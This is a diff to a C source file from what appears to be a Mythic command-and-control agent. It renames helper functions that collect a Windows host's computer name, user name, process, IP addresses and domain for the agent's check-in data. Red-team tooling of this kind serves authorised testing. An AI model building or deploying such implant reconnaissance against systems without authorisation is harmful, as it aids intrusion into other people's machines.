@@ -5,13 +5,13 @@
 #include <iphlpapi.h>
 #include <lmcons.h>
 
-static void get_host(char *dst, size_t cap) {
+void sysinfo_host(char *dst, size_t cap) {
     DWORD n = (DWORD)cap;
     dst[0] = '\0';
     GetComputerNameA(dst, &n);
 }
 
-static void get_user(char *dst, size_t cap) {
+void sysinfo_user(char *dst, size_t cap) {
     DWORD n = (DWORD)cap;
     dst[0] = '\0';
     GetUserNameA(dst, &n);
@@ -30,7 +30,7 @@ static void get_process(char *dst, size_t cap) {
 
 /* First non-loopback IPv4s, comma-joined. Mythic wants a list; a single
  * comma string degrades gracefully on agents without JSON arrays here. */
-static void get_ips(char *dst, size_t cap) {
+void sysinfo_ips(char *dst, size_t cap) {
     ULONG len = 0;
     IP_ADAPTER_ADDRESSES *addrs = NULL, *a;
     size_t used = 0;
@@ -75,10 +75,10 @@ void sysinfo_attach(cJSON *obj) {
     char host[256], user[UNLEN + 1], proc[260], ips[1024], domain[256];
     const char *dom;
     cJSON *arr;
-    get_host(host, sizeof(host));
-    get_user(user, sizeof(user));
+    sysinfo_host(host, sizeof(host));
+    sysinfo_user(user, sizeof(user));
     get_process(proc, sizeof(proc));
-    get_ips(ips, sizeof(ips));
+    sysinfo_ips(ips, sizeof(ips));
     dom = getenv("USERDNSDOMAIN");
     if (!dom || !*dom)
         dom = getenv("USERDOMAIN");
